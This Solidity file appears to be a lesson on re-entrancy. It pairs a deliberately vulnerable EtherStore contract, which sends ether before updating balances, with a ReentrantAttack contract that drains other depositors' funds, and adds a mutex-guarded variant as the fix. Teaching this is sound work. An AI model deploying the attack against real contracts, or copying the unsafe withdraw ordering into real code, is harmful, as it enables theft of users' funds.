// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

/*
EtherStore is a contract where you can deposit any amount and withdraw at most
1 Ether per week. This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/
import "hardhat/console.sol";

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
contract EtherStore is ReEntrancyGuard{
    // Withdrawal limit = 1 ether / week
    uint constant public WITHDRAWAL_LIMIT = 1 ether;
    mapping(address => uint) public lastWithdrawTime;
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        // console.log("msg.sender: %s, deposit: %s, balance[sender]: %s",msg.sender,  msg.value, balances[msg.sender]);
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        require(_amount <= WITHDRAWAL_LIMIT);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] -= _amount;
        lastWithdrawTime[msg.sender] = block.timestamp;
        // console.log("msg.sender: %s, widraw: %s, balance[sender]: %s",msg.sender,  _amount, balances[msg.sender]);
    }

    function withdraw_noReentrant(uint _amount) public noReentrant{
        require(balances[msg.sender] >= _amount);
        require(_amount <= WITHDRAWAL_LIMIT);
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] -= _amount;
        lastWithdrawTime[msg.sender] = block.timestamp;
        // console.log("msg.sender: %s, widraw: %s, balance[sender]: %s",msg.sender,  _amount, balances[msg.sender]);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReentrantAttack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        console.log('attack()', address(this) , address(this).balance);
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


contract ReentrantAttackFixed {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw_noReentrant(1 ether);
        }
    }

    function attackNonReetrant() external payable {
        console.log('attackNonReetrant()', address(this) , address(this).balance);
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw_noReentrant(1 ether);    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
